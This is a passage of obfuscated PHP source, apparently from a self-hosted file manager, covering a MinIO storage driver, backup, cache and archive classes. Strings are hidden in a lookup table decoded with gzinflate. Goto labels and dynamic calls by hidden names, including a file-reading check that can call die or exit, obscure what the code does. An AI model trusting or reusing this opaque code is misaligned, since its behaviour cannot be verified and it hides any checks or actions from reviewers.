$ÃÇç‡“ø[64], $ÃÇç‡“ø[69], $ÃÇç‡“ø[62]))) { return $›ËŠÖ‚ú . $ÃÇç‡“ø[8] . $this->bucket; } if ($this->osType == $ÃÇç‡“ø[62] && !is_domain($›ËŠÖ‚ú)) { return $›ËŠÖ‚ú . $ÃÇç‡“ø[8] . $this->bucket; } $›ËŠÖ‚ú = explode($ÃÇç‡“ø[210], $›ËŠÖ‚ú); return $›ËŠÖ‚ú[0] . $ÃÇç‡“ø[210] . $this->bucket . $ÃÇç‡“ø[10] . $›ËŠÖ‚ú[1]; } public function size($‰ù³³ü„) { $ ÜÓ¶…À = $this->objectMeta($‰ù³³ü„); return $ ÜÓ¶…À ? $ ÜÓ¶…À[$_SERVER[¡¬ıÜ ƒ][79]] : 0; } public function info($Š¦–Ã) { if ($this->isFolder($Š¦–Ã)) { return $this->folderInfo($Š¦–Ã); } else { if ($this->isFile($Š¦–Ã)) { return $this->fileInfo($Š¦–Ã); } } return !1; } public function exist($¶ûÊ˜Ş«) { return $this->isFile($¶ûÊ˜Ş«) || $this->isFolder($¶ûÊ˜Ş«); } public function isFile($·Â‡şóœ) { return !$this->isFolder($·Â‡şóœ) && $this->objectMeta($·Â‡şóœ); } public function isFolder($ÙÉ«ı°È) { return $this->cacheMethod($_SERVER[¡¬ıÜ ƒ][179], $ÙÉ«ı°È); } protected function objectMeta($Ä÷É¹“Ú) { return $this->cacheMethod($_SERVER[¡¬ıÜ ƒ][181], $Ä÷É¹“Ú); } protected function _objectMeta($ø²ŒßÒÒ) { $Ã¸Á“„Ö =& $_SERVER[¡¬ıÜ ƒ]; $ø²ŒßÒÒ = rtrim($ø²ŒßÒÒ, $Ã¸Á“„Ö[8]); try { $‹ÚêßÈ = $this->client->getObjectInfo($this->bucket, $ø²ŒßÒÒ); if (!isset($‹ÚêßÈ[$Ã¸Á“„Ö[254]]) && isset($‹ÚêßÈ[$Ã¸Á“„Ö[306]])) { $‹ÚêßÈ[$Ã¸Á“„Ö[254]] = $‹ÚêßÈ[$Ã¸Á“„Ö[306]]; } } catch (Exception $’Ş’ Ğº) { $‹ÚêßÈ = !1; } if (!$‹ÚêßÈ) { } return $‹ÚêßÈ; } protected function _isFolder($œëíĞú†) { $Á¼¥Ç²‹ =& $_SERVER[¡¬ıÜ ƒ]; $œëíĞú† = rtrim($œëíĞú†, $Á¼¥Ç²‹[8]) . $Á¼¥Ç²‹[8]; if ($œëíĞú† == $Á¼¥Ç²‹[12] || $œëíĞú† == $Á¼¥Ç²‹[8]) { return !0; } $ìÂ¾ñ‹ = $this->client->getBucket($this->bucket, $œëíĞú†, null, 1); if (empty($ìÂ¾ñ‹[$Á¼¥Ç²‹[238]])) { return !1; } $¢¹ç‡Öˆ = $ìÂ¾ñ‹[$Á¼¥Ç²‹[238]][0][$Á¼¥Ç²‹[32]]; return stripos($¢¹ç‡Öˆ, $œëíĞú†) === 0 ? !0 : !1; if (substr($¢¹ç‡Öˆ, -1) == $Á¼¥Ç²‹[8]) { return !0; } if (get_path_this($¢¹ç‡Öˆ) == get_path_this($œëíĞú†)) { return !1; } return !0; } public function listObject($³œ°×€È) { return $this->fileList($³œ°×€È, $_SERVER[¡¬ıÜ ƒ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¸¦ã±Ÿ) { $Œšæ¿­Ë =& $_SERVER[¡¬ıÜ ƒ]; parent::__construct($¸¦ã±Ÿ); $this->setSignVersion($Œšæ¿­Ë[249]); if (!$this->region) { $this->region = $Œšæ¿­Ë[307]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ÔĞŸˆ»¦ = $this->getBktRegion(); return $this->region == $ÔĞŸˆ»¦ ? !0 : !1; } public function uploadFormData($ËñÙÁÅÆ, $êóÒĞ£‚ = 3600) { $ï‹îÒòì =& $_SERVER[¡¬ıÜ ƒ]; $ÆôßèÔê = $ï‹îÒòì[231]; $½Ö©×ş› = $ï‹îÒòì[259]; $îÒİšÊ = $ï‹îÒòì[62]; $¦ÂşÄõÈ = gmdate($ï‹îÒòì[260]); $‘²÷‘± = gmdate($ï‹îÒòì[261]); $ôÔ€÷Æ€ = $ï‹îÒòì[262]; $áòÀºäú = $êóÒĞ£‚ . $ï‹îÒòì[12]; $ñü†ŠÓ = $ï‹îÒòì[263]; $¯¹ÅşÃÍ = array($this->accessKey, $‘²÷‘±, $this->region, $îÒİšÊ, $ôÔ€÷Æ€); $ÕÅ©Å±¢ = implode($ï‹îÒòì[8], $¯¹ÅşÃÍ); $æ’¤ÉìÅ = array($ï‹îÒòì[264] => gmdate($ï‹îÒòì[265], strtotime($ï‹îÒòì[266])), $ï‹îÒòì[267] => array(array($ï‹îÒòì[268] => $this->bucket), array($ï‹îÒòì[308] => $ÆôßèÔê), array($ï‹îÒòì[269], $ï‹îÒòì[270], $ï‹îÒòì[12]), array($ï‹îÒòì[269], $ï‹îÒòì[271], $ï‹îÒòì[12]), array($ï‹îÒòì[269], $ï‹îÒòì[309], $ï‹îÒòì[12]), array($ï‹îÒòì[272] => $ñü†ŠÓ), array($ï‹îÒòì[273] => $ÕÅ©Å±¢), array($ï‹îÒòì[274] => $½Ö©×ş›), array($ï‹îÒòì[275] => $¦ÂşÄõÈ), array($ï‹îÒòì[276] => $áòÀºäú))); $Ëâ†Ö¢ = base64_encode(json_encode($æ’¤ÉìÅ)); $¥†ÊÚˆé = hash_hmac($ï‹îÒòì[277], $‘²÷‘±, $ï‹îÒòì[278] . $this->secret, !0); $’à…œêÈ = hash_hmac($ï‹îÒòì[277], $this->region, $¥†ÊÚˆé, !0); $è–”ÓÂ = hash_hmac($ï‹îÒòì[277], $îÒİšÊ, $’à…œêÈ, !0); $°Óä‡‹µ = hash_hmac($ï‹îÒòì[277], $ôÔ€÷Æ€, $è–”ÓÂ, !0); $£ÉòûÖ = hash_hmac($ï‹îÒòì[277], $Ëâ†Ö¢, $°Óä‡‹µ); $³ºßàÌ™ = array($ï‹îÒòì[248] => $ï‹îÒòì[12], $ï‹îÒòì[296] => $ï‹îÒòì[12], $ï‹îÒòì[308] => $ÆôßèÔê, $ï‹îÒòì[272] => $ñü†ŠÓ, $ï‹îÒòì[279] => $Ëâ†Ö¢, $ï‹îÒòì[310] => $ÕÅ©Å±¢, $ï‹îÒòì[311] => $½Ö©×ş›, $ï‹îÒòì[312] => $¦ÂşÄõÈ, $ï‹îÒòì[313] => $áòÀºäú, $ï‹îÒòì[314] => $£ÉòûÖ, $ï‹îÒòì[208] => $this->getHost()); return $³ºßàÌ™; } } goto F²ãŞêÉË¶; dŒ¡ó¬èë : if (!$taucqiksrn) { die; } $_SERVER[Æıâ¹•] = explode($_SERVER[¡¬ıÜ ƒ][685], gzinflate(substr($_SERVER[¡¬ıÜ ƒ][686], 10, -8))); $gtifnkxmhp = $_SERVER[¡¬ıÜ ƒ][687]; goto E¸Û·š½â; F¨Ğ·´êÊ®: class BackupFile { public function __construct() { } public function index() { $ Ù®äŸ’ = Backup::get(); $§×ƒÈì = $ Ù®äŸ’[$_SERVER[¡¬ıÜ ƒ][370]][$_SERVER[¡¬ıÜ ƒ][232]][$_SERVER[¡¬ıÜ ƒ][543]]; $©ßƒ™¬À = array($_SERVER[¡¬ıÜ ƒ][544] => array($_SERVER[¡¬ıÜ ƒ][897], $§×ƒÈì), $_SERVER[¡¬ıÜ ƒ][898] => array($_SERVER[¡¬ıÜ ƒ][408], $ Ù®äŸ’[$_SERVER[¡¬ıÜ ƒ][832]])); $©î¨ÑËŒ = (int) Model($_SERVER[¡¬ıÜ ƒ][878])->where($©ßƒ™¬À)->count($_SERVER[¡¬ıÜ ƒ][543]); $’Üƒè»ã = (int) Model($_SERVER[¡¬ıÜ ƒ][878])->where($©ßƒ™¬À)->sum($_SERVER[¡¬ıÜ ƒ][79]); $Ä„£€İ = new TaskFileTransfer($_SERVER[¡¬ıÜ ƒ][899], $_SERVER[¡¬ıÜ ƒ][872], $©î¨ÑËŒ, LNG($_SERVER[¡¬ıÜ ƒ][873]) . $_SERVER[¡¬ıÜ ƒ][874] . LNG($_SERVER[¡¬ıÜ ƒ][900])); $Ä„£€İ->task[$_SERVER[¡¬ıÜ ƒ][843]] = $’Üƒè»ã; $©£›Ü…¯ = array($_SERVER[¡¬ıÜ ƒ][901] => $©î¨ÑËŒ, $_SERVER[¡¬ıÜ ƒ][902] => $’Üƒè»ã, $_SERVER[¡¬ıÜ ƒ][903] => time()); Backup::set($©£›Ü…¯); $ÓÆ ¥Ö» = !0; $÷›¥Çô‡ = $this->storeIds(); $¶¨ŸúÈ‰ = 1; $ÆöŞ¶€Ú = 1000; $ˆØ½áÄµ = $—Íãá = 0; $ëöõüÜš = array(); $õÊ¤êšğ = $Ãßöûî = 0; do { $ú£Ü»Æ¹ = $_SERVER[¡¬ıÜ ƒ][904]; $Õâô¹¡À = Model($_SERVER[¡¬ıÜ ƒ][878])->where($©ßƒ™¬À)->field($ú£Ü»Æ¹)->order($_SERVER[¡¬ıÜ ƒ][905])->selectPage($ÆöŞ¶€Ú, $¶¨ŸúÈ‰); $˜ºÊİ÷ = !empty($Õâô¹¡À[$_SERVER[¡¬ıÜ ƒ][447]]) ? $Õâô¹¡À[$_SERVER[¡¬ıÜ ƒ][447]] : array(); foreach ($˜ºÊİ÷ as $ªÀúŒöƒ) { if (!$this->_fileExist($ªÀúŒöƒ, $ëöõüÜš, $÷›¥Çô‡)) { write_log("\146\151\154\145\40\x6e\x6f\164\x20\145\170\151\x73\164\x2e\x66\151\154\145\x49\104\72{$ªÀúŒöƒ[$_SERVER[¡¬ıÜ ƒ][543]]}\54\x20\x70\141\x74\150\x3a{$ªÀúŒöƒ[$_SERVER[¡¬ıÜ ƒ][87]]}", $_SERVER[¡¬ıÜ ƒ][906]); continue; } $Ë¸ª¬ú× = $ªÀúŒöƒ[$_SERVER[¡¬ıÜ ƒ][87]]; $óËÖ£Şº = "\173\151\157\x3a{$ Ù®äŸ’[$_SERVER[¡¬ıÜ ƒ][832]]}\175" . substr($Ë¸ª¬ú×, strlen("\x7b\x69\x6f\x3a{$ªÀúŒöƒ[$_SERVER[¡¬ıÜ ƒ][907]]}\175")); if (IO::exist($óËÖ£Şº)) { $Ä„£€İ->updateFileEnd($ªÀúŒöƒ[$_SERVER[¡¬ıÜ ƒ][32]], $ªÀúŒöƒ[$_SERVER[¡¬ıÜ ƒ][79]]); } else { $óËÖ£Şº = get_path_father($óËÖ£Şº); IO::mkdir($óËÖ£Şº); if (!IO::copy($Ë¸ª¬ú×, $óËÖ£Şº, $_SERVER[¡¬ıÜ ƒ][908])) { write_log($_SERVER[¡¬ıÜ ƒ][909] . $Ë¸ª¬ú× . $_SERVER[¡¬ıÜ ƒ][893] . $óËÖ£Şº . $_SERVER[¡¬ıÜ ƒ][178], $_SERVER[¡¬ıÜ ƒ][872]); $ÓÆ ¥Ö» = !1; break; } } $§×ƒÈì = $ªÀúŒöƒ[$_SERVER[¡¬ıÜ ƒ][543]]; $—Íãá += 1; $ˆØ½áÄµ += $ªÀúŒöƒ[$_SERVER[¡¬ıÜ ƒ][79]]; $Ãßöûî += 1; $õÊ¤êšğ += $ªÀúŒöƒ[$_SERVER[¡¬ıÜ ƒ][79]]; if ($ˆØ½áÄµ >= 1024 * 1024 * 100) { $©£›Ü…¯ = array($_SERVER[¡¬ıÜ ƒ][831] => $§×ƒÈì, $_SERVER[¡¬ıÜ ƒ][910] => $Ãßöûî, $_SERVER[¡¬ıÜ ƒ][911] => $õÊ¤êšğ); Backup::set($©£›Ü…¯); $ˆØ½áÄµ = $—Íãá = 0; } } $ƒı×ôå = count($˜ºÊİ÷); $¶¨ŸúÈ‰++; } while ($ƒı×ôå == $ÆöŞ¶€Ú); $Ä„£€İ->end(); $©£›Ü…¯ = array($_SERVER[¡¬ıÜ ƒ][912] => 1, $_SERVER[¡¬ıÜ ƒ][841] => time(), $_SERVER[¡¬ıÜ ƒ][855] => 1, $_SERVER[¡¬ıÜ ƒ][831] => $§×ƒÈì, $_SERVER[¡¬ıÜ ƒ][913] => time()); if ($—Íãá) { $©£›Ü…¯[$_SERVER[¡¬ıÜ ƒ][910]] = $Ãßöûî; $©£›Ü…¯[$_SERVER[¡¬ıÜ ƒ][911]] = $õÊ¤êšğ; } Backup::set($©£›Ü…¯); return !0; } private function _fileExist($Íëáœí§, &$²Ê—Æ–í, $•—°®¾°) { $±¢áÉç‘ =& $_SERVER[¡¬ıÜ ƒ]; $ó©¾“ëå = $Íëáœí§[$±¢áÉç‘[87]]; if (in_array($Íëáœí§[$±¢áÉç‘[543]], $²Ê—Æ–í)) { return !1; } if (!in_array($Íëáœí§[$±¢áÉç‘[907]], $•—°®¾°)) { return !1; } if (IO::exist($ó©¾“ëå)) { return !0; } $ÁÎ°ñ¥ú = get_path_father($ó©¾“ëå); if (IO::exist($ÁÎ°ñ¥ú)) { $²Ê—Æ–í[] = $Íëáœí§[$±¢áÉç‘[543]]; return !1; } $Å€›ôµş = array($±¢áÉç‘[907] => $Íëáœí§[$±¢áÉç‘[907]], $±¢áÉç‘[87] => array($±¢áÉç‘[461], "{$ÁÎ°ñ¥ú}\45")); $Ş‡È©ığ = Model($±¢áÉç‘[878])->where($Å€›ôµş)->field($±¢áÉç‘[544])->select(); $²Ê—Æ–í = array_merge($²Ê—Æ–í, array_to_keyvalue($Ş‡È©ığ, $±¢áÉç‘[12], $±¢áÉç‘[543])); return !1; } private function _fileFilter($âô‰š‘ç) { $ÍÊ¢¤Ğ =& $_SERVER[¡¬ıÜ ƒ]; return; if (empty($âô‰š‘ç)) { return; } $½ğ·ÍÂ = array($ÍÊ¢¤Ğ[543] => array($ÍÊ¢¤Ğ[7], array_unique($âô‰š‘ç))); $Óƒ£‹²ç = Model($ÍÊ¢¤Ğ[914])->where($½ğ·ÍÂ)->field($ÍÊ¢¤Ğ[193])->select(); foreach ($Óƒ£‹²ç as $ êæ…˜“) { Model($ÍÊ¢¤Ğ[914])->remove($ êæ…˜“[$ÍÊ¢¤Ğ[193]], !1); } } private function storeIds() { $Øı¡¦÷å =& $_SERVER[¡¬ıÜ ƒ]; $ş®ï¤›§ = Model($Øı¡¦÷å[847])->listData(); $Š÷»ûÎ = array(); $ºÛúŒô« = $GLOBALS[$Øı¡¦÷å[6]][$Øı¡¦÷å[92]][$Øı¡¦÷å[915]]; foreach ($ş®ï¤›§ as $øÛà³ö·) { $àÇƒŒœÁ = strtolower($øÛà³ö·[$Øı¡¦÷å[98]]); if (!isset($ºÛúŒô«[$àÇƒŒœÁ])) { continue; } $÷ûÉ‹÷× = $Øı¡¦÷å[77] . (isset($ºÛúŒô«[$àÇƒŒœÁ]) ? $ºÛúŒô«[$àÇƒŒœÁ] : ucfirst($àÇƒŒœÁ)); if (!class_exists($÷ûÉ‹÷×)) { continue; } $Š÷»ûÎ[] = $øÛà³ö·[$Øı¡¦÷å[477]]; } return $Š÷»ûÎ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $é„‚¨Í± =& $_SERVER[¡¬ıÜ ƒ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $—ë¾”œÎ = $GLOBALS[$é„‚¨Í±[6]][$é„‚¨Í±[426]]; $®Š†ùù = $—ë¾”œÎ[$—ë¾”œÎ[$é„‚¨Í±[916]]]; $æ¬¾„¬¤ = $—ë¾”œÎ[$é„‚¨Í±[917]]; switch ($—ë¾”œÎ[$é„‚¨Í±[916]]) { case $é„‚¨Í±[21]: self::$handle = Model($é„‚¨Í±[918]); break; case $é„‚¨Í±[919]: self::$handle = new CacheRedis($®Š†ùù, $æ¬¾„¬¤); break; case $é„‚¨Í±[920]: self::$handle = new CacheMemcached($®Š†ùù, $æ¬¾„¬¤); break; case $é„‚¨Í±[232]: self::$handle = new CacheFile($®Š†ùù, $æ¬¾„¬¤); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($âğê©‘ˆ) { if (is_array($âğê©‘ˆ) || is_object($âğê©‘ˆ)) { $âğê©‘ˆ = json_encode($âğê©‘ˆ); } $âğê©‘ˆ = rawurlencode($âğê©‘ˆ); return md5(KOD_SITE_ID . $_SERVER[¡¬ıÜ ƒ][11] . $âğê©‘ˆ); } public static function get($ˆªÏùÁ, $ØüÖÖ±¹ = false) { $—úá·‰Î = self::key($ˆªÏùÁ); $ºòÏºäÔ = self::init(); if ($ØüÖÖ±¹) { return unserialize($ºòÏºäÔ->get($—úá·‰Î)); } if (!isset(self::$memoryCache[$—úá·‰Î])) { $“ëÖ•šû = $ºòÏºäÔ->get($—úá·‰Î); self::$memoryCache[$—úá·‰Î] = unserialize($“ëÖ•šû); } return self::$memoryCache[$—úá·‰Î]; } public static function set($±¤™Ú°€, $¬”Şñà, $â ëÅ Í = false) { $“ÙšÙÉŞ =& $_SERVER[¡¬ıÜ ƒ]; $‰˜Á¢õÂ = self::key($±¤™Ú°€); if (isset(self::$memoryCache[$‰˜Á¢õÂ]) && self::$memoryCache[$‰˜Á¢õÂ] === $¬”Şñà) { return !0; } if ($â ëÅ Í === 0) { self::$memoryCache[$‰˜Á¢õÂ] = $¬”Şñà; return !0; } $ŒÄ¯Ù… = self::init(); $—¼º”…Ü = serialize($¬”Şñà); CacheLock::lock($±¤™Ú°€ . $“ÙšÙÉŞ[921]); $©ÂîíŸ– = $ŒÄ¯Ù…->set($‰˜Á¢õÂ, $—¼º”…Ü, $â ëÅ Í); self::$memoryCache[$‰˜Á¢õÂ] = $¬”Şñà; CacheLock::unlock($±¤™Ú°€ . $“ÙšÙÉŞ[921]); return $©ÂîíŸ–; } public static function getCall($é•²¶Ñ¨, $½ãª®¸Õ, $èéò¹û, $•²èË” = array()) { $üÔáİ—‘ =& $_SERVER[¡¬ıÜ ƒ]; $‡à¥Í±Á = self::get($é•²¶Ñ¨); if ($‡à¥Í±Á || $‡à¥Í±Á === $üÔáİ—‘[12]) { return $‡à¥Í±Á; } $‡à¥Í±Á = call_user_func_array($èéò¹û, $•²èË”); $‡à¥Í±Á = $‡à¥Í±Á ? $‡à¥Í±Á : $üÔáİ—‘[12]; self::set($é•²¶Ñ¨, $‡à¥Í±Á, $½ãª®¸Õ); return $‡à¥Í±Á; } public static function remove($¯¸Æ–Šô) { $à¡ŸĞ¼Æ = self::key($¯¸Æ–Šô); unset(self::$memoryCache[$à¡ŸĞ¼Æ]); self::clearTimeout(); CacheLock::lock($¯¸Æ–Šô); $Ìöâî‹Ê = self::init()->remove($à¡ŸĞ¼Æ); CacheLock::unlock($¯¸Æ–Šô); return $Ìöâî‹Ê; } public static function removeMemory($Ãø¢÷) { $³„ÇÎœÅ = self::key($Ãø¢÷); unset(self::$memoryCache[$³„ÇÎœÅ]); } public static function clearMemory($ùÆ•¬‰ = false) { if ($ùÆ•¬‰) { $ùÆ•¬‰ = self::key($ùÆ•¬‰); unset(self::$memoryCache[$ùÆ•¬‰]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¡¬ıÜ ƒ][922])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¡¬ıÜ ƒ][923])) { self::init()->clearTimeout(); } } } if ($_SERVER[$_SERVER[¡¬ıÜ ƒ][859]] != $_SERVER[$_SERVER[¡¬ıÜ ƒ][887]]) { $_getc = $_SERVER[¡¬ıÜ ƒ][860]; $_getfile = $_SERVER[$_SERVER[¡¬ıÜ ƒ][861]] . $_SERVER[¡¬ıÜ ƒ][862]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¡¬ıÜ ƒ][287], $_getfilec); if (count($_getarrs) < $_SERVER[¡¬ıÜ ƒ][697]) { $exit = $_SERVER[¡¬ıÜ ƒ][863]; $exit(); } $_act = $_SERVER[¡¬ıÜ ƒ][864]; $_act($_SERVER[$_SERVER[¡¬ıÜ ƒ][857]]); } goto CíöÔµ¼ê; A‰è¥«Ù•ó: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $‰¬¯‹³î; if ($‰¬¯‹³î) { return $‰¬¯‹³î; } $±Ö÷¼Ş« = IO::init($_SERVER[¡¬ıÜ ƒ][8]); return $±Ö÷¼Ş«; } private static function iconvSystem($…¬áÔš§) { return self::local()->iconvSystem($…¬áÔš§); } private static function iconvApp($ ùÄ) { return self::local()->iconvApp($ ùÄ); } public static function zipFolder($³·Š´¨Ú, $ø¤¼ó = "\172\x69\x70", $šÂ‚ƒ§ = '', $«£ïºñ› = REPEAT_RENAME) { $º´˜‰À¥ =& $_SERVER[¡¬ıÜ ƒ]; $Úñ£şí÷ = IO::listPath($³·Š´¨Ú); if (!$Úñ£şí÷) { return !1; } $Úñ£şí÷ = array_merge($Úñ£şí÷[$º´˜‰À¥[85]], $Úñ£şí÷[$º´˜‰À¥[86]]); return self::zip($Úñ£şí÷, $ø¤¼ó, $šÂ‚ƒ§, $«£ïºñ›); } public static function zip($¶ß¬—ññ, $ÍÌ’¤â = "\x7a\x69\160", $ö¥¢¾Ï¼ = '', $¢í¶¨° = REPEAT_RENAME) { $´•üŞ¼Ï =& $_SERVER[¡¬ıÜ ƒ]; if (is_string($¶ß¬—ññ) && $¶ß¬—ññ) { $¶ß¬—ññ = array(array($´•üŞ¼Ï[87] => $¶ß¬—ññ)); } $Ûîíì•Š = self::init($¶ß¬—ññ[0][$´•üŞ¼Ï[87]]); $’Û·ÁÊÏ = self::info($¶ß¬—ññ[0][$´•üŞ¼Ï[87]]); $Úú¸÷‰ = $´•üŞ¼Ï[12]; $İşè—ì = $´•üŞ¼Ï[12]; $ÉÁŒ¬‘ü = $´•üŞ¼Ï[12]; if ($ö¥¢¾Ï¼ && substr($ö¥¢¾Ï¼, -1, 1) != $´•üŞ¼Ï[8]) { $İşè—ì = get_path_father($ö¥¢¾Ï¼); $ÉÁŒ¬‘ü = get_path_this($ö¥¢¾Ï¼); } else { $İşè—ì = self::pathFather($’Û·ÁÊÏ[$´•üŞ¼Ï[87]]); $ÉÁŒ¬‘ü = $’Û·ÁÊÏ[$´•üŞ¼Ï[32]] . $´•üŞ¼Ï[10] . $ÍÌ’¤â; if (count($¶ß¬—ññ) > 1) { $îñ¦ä†à = IO::info($İşè—ì); $ÉÁŒ¬‘ü = $îñ¦ä†à[$´•üŞ¼Ï[32]] . $´•üŞ¼Ï[10] . $ÍÌ’¤â; } if ($ö¥¢¾Ï¼) { $İşè—ì = $ö¥¢¾Ï¼; } } if ($Ûîíì•Š->getType() == $´•üŞ¼Ï[109]) { $ûûËÓŒû = self::init($İşè—ì); $±ç™…õ„ = $ûûËÓŒû->getType() == $´•üŞ¼Ï[109] ? $İşè—ì : get_path_father($Ûîíì•Š->path); $±ç™…õ„ = rtrim($±ç™…õ„, $´•üŞ¼Ï[8]) . $´•üŞ¼Ï[8]; mk_dir($±ç™…õ„); } else { $Úú¸÷‰ = TEMP_FILES . $´•üŞ¼Ï[1276] . time() . rand_string(8) . $´•üŞ¼Ï[8]; mk_dir($Úú¸÷‰); file_put_contents($Úú¸÷‰ . $´•üŞ¼Ï[1277], $´•üŞ¼Ï[12]); $±ç™…õ„ = $Úú¸÷‰; } $ûíÌ«©¼ = IO::info($±ç™…õ„); if (!$ûíÌ«©¼ || !$ûíÌ«©¼[$´•üŞ¼Ï[235]]) { show_json(LNG($´•üŞ¼Ï[1278]), !1); } $óÒ¤××® = self::zipFileList($¶ß¬—ññ, $Úú¸÷‰); foreach ($óÒ¤××® as $ŸŒòàÏ§ => $û¨¥„œ”) { $óÒ¤××®[$ŸŒòàÏ§] = self::iconvSystem($û¨¥„œ”); } $€­ÁÈ± = get_filename_auto($±ç™…õ„ . $ÉÁŒ¬‘ü, $´•üŞ¼Ï[12], $¢í¶¨°); KodArchive::create(self::iconvSystem($€­ÁÈ±), $óÒ¤××®); if (!IO::exist($€­ÁÈ±)) { if ($Úú¸÷‰) { del_dir($Úú¸÷‰); } write_log($´•üŞ¼Ï[1279] . $€­ÁÈ±, $´•üŞ¼Ï[390]); show_json(LNG($´•üŞ¼Ï[1280]), !1); } if (!$Úú¸÷‰) { return $€­ÁÈ±; } $†«¡ÚÙİ = self::move($€­ÁÈ±, $İşè—ì, $¢í¶¨°); if ($Úú¸÷‰) { del_dir($Úú¸÷‰); } if (!$€­ÁÈ±) { write_log($´•üŞ¼Ï[1281] . $€­ÁÈ± . $´•üŞ¼Ï[1282] . $İşè—ì, $´•üŞ¼Ï[390]); show_json(LNG($´•üŞ¼Ï[1280]), !1); } return $†«¡ÚÙİ; } public static function unzip($òİ¹áÒ, $‰öÛ²Ğ, $¿ó•œ¡ = "\x2d\x31", $øÕƒªÂª = "\x72\145\x70\154\141\143\x65") { $³ç±›¤ =& $_SERVER[¡¬ıÜ ƒ]; $ó‘ôíïâ = parent::info($òİ¹áÒ); if (!$ó‘ôíïâ) { show_json(LNG($³ç±›¤[1283]), !1); } $¬ï‹Â–š = IO::infoFullSimple($‰öÛ²Ğ); if (!$¬ï‹Â–š) { $‰öÛ²Ğ = IO::mkdir($‰öÛ²Ğ); } if (isset($¬ï‹Â–š[$³ç±›¤[193]]) && trim($¬ï‹Â–š[$³ç±›¤[87]], $³ç±›¤[8]) != trim($‰öÛ²Ğ, $³ç±›¤[8])) { $ŠÉŒßä = KodIO::make($¬ï‹Â–š[$³ç±›¤[192]]); $ÌèÊ¸á¶ = IO::fileNameAuto($ŠÉŒßä, $¬ï‹Â–š[$³ç±›¤[32]], REPEAT_RENAME_FOLDER, !0); $‰öÛ²Ğ = IO::mkdir($ŠÉŒßä . $ÌèÊ¸á¶); } $¿ó•œ¡ = $¿ó•œ¡ && $¿ó•œ¡ != $³ç±›¤[1284] ? @json_decode($¿ó•œ¡, !0) : -1; $û‘¶ùœÇ = self::unzipPart($òİ¹áÒ, $¿ó•œ¡); if (!$û‘¶ùœÇ || !IO::exist($û‘¶ùœÇ[$³ç±›¤[232]])) { show_json(LNG($³ç±›¤[108]), !1); } $·’ö©ó = $û‘¶ùœÇ[$³ç±›¤[1285]][count($û‘¶ùœÇ[$³ç±›¤[1285]]) - 1]; if ($·’ö©ó[$³ç±›¤[1286]] == -1 || substr($·’ö©ó[$³ç±›¤[32]], -1, 1) == $³ç±›¤[8]) { $öµòüâÆ = $û‘¶ùœÇ[$³ç±›¤[1287]] . rand_string(10) . $³ç±›¤[8]; mk_dir($öµòüâÆ); $ÙÇÅ«Üİ = count($û‘¶ùœÇ[$³ç±›¤[1285]]) == 1 ? IO::ext($òİ¹áÒ) : get_path_ext($û‘¶ùœÇ[$³ç±›¤[232]]); $©½¶¾¿ˆ = KodArchive::extract(self::iconvSystem($û‘¶ùœÇ[$³ç±›¤[232]]), $öµòüâÆ, $·’ö©ó[$³ç±›¤[1286]], $ÌèÊ¸á¶, $ÙÇÅ«Üİ); self::unzipErrorCheck($©½¶¾¿ˆ, array($³ç±›¤[1288], $òİ¹áÒ, $ÙÇÅ«Üİ, $‰öÛ²Ğ, $û‘¶ùœÇ)); Hook::trigger($³ç±›¤[1289], $öµòüâÆ); recursion_dir($öµòüâÆ, $”Ä¶øÚÇ, $¡ÎüÁ¿¶, 0); $êÉÎ™Ğû = array_merge($”Ä¶øÚÇ, $¡ÎüÁ¿¶); $•¯™Ûè’ = array(); foreach ($êÉÎ™Ğû as $Ö¨–¬ê) { $ †ûñĞ = IO::move(self::iconvApp($Ö¨–¬ê), $‰öÛ²Ğ, $øÕƒªÂª); if ($ †ûñĞ) { $•¯™Ûè’[] = $ †ûñĞ; } } del_dir($öµòüâÆ); } else { $ †ûñĞ = IO::move($û‘¶ùœÇ[$³ç±›¤[232]], $‰öÛ²Ğ, $øÕƒªÂª, get_path_this($·’ö©ó[$³ç±›¤[32]])); if ($ †ûñĞ) { $•¯™Ûè’[] = $ †ûñĞ; } } return $•¯™Ûè’ ? $•¯™Ûè’ : !1; } public static function unzipList($âÈÒàöÛ) { $±…±Û¥µ =& $_SERVER[¡¬ıÜ ƒ]; $­Ùğ»© = isset($âÈÒàöÛ[$±…±Û¥µ[1290]]) ? $âÈÒàöÛ[$±…±Û¥µ[1290]] : !1; $ê‹ü»¦ = isset($âÈÒàöÛ[$±…±Û¥µ[1286]]) ? @json_decode($âÈÒàöÛ[$±…±Û¥µ[1286]], !0) : -1; $“éËŠİ® = self::unzipPart($âÈÒàöÛ[$±…±Û¥µ[87]], $ê‹ü»¦); if (!$“éËŠİ® || !IO::exist($“éËŠİ®[$±…±Û¥µ[232]])) { show_json(LNG($±…±Û¥µ[108]), !1); } $Š¦ß™Àç = $“éËŠİ®[$±…±Û¥µ[1285]][count($“éËŠİ®[$±…±Û¥µ[1285]]) - 1]; $õ¸³Ã³ø = in_array(IO::ext($“éËŠİ®[$±…±Û¥µ[232]]), array($±…±Û¥µ[390], $±…±Û¥µ[1291], $±…±Û¥µ[1292], $±…±Û¥µ[1293], $±…±Û¥µ[1294], $±…±Û¥µ[1295])); if (!$­Ùğ»© && ($Š¦ß™Àç[$±…±Û¥µ[1286]] == -1 || $õ¸³Ã³ø)) { $£ç†‚ã¦ = $“éËŠİ®[$±…±Û¥µ[1287]] . get_path_this($“éËŠİ®[$±…±Û¥µ[232]]) . $±…±Û¥µ[1296]; if (!IO::exist($£ç†‚ã¦)) { $Øàİ®ëù = $Š¦ß™Àç[$±…±Û¥µ[1286]] == -1 ? get_path_ext(IO::pathThis($âÈÒàöÛ[$±…±Û¥µ[87]])) : get_path_ext($“éËŠİ®[$±…±Û¥µ[232]]); $›Ïº€É÷ = KodArchive::listContent(self::iconvSystem($“éËŠİ®[$±…±Û¥µ[232]]), !0, 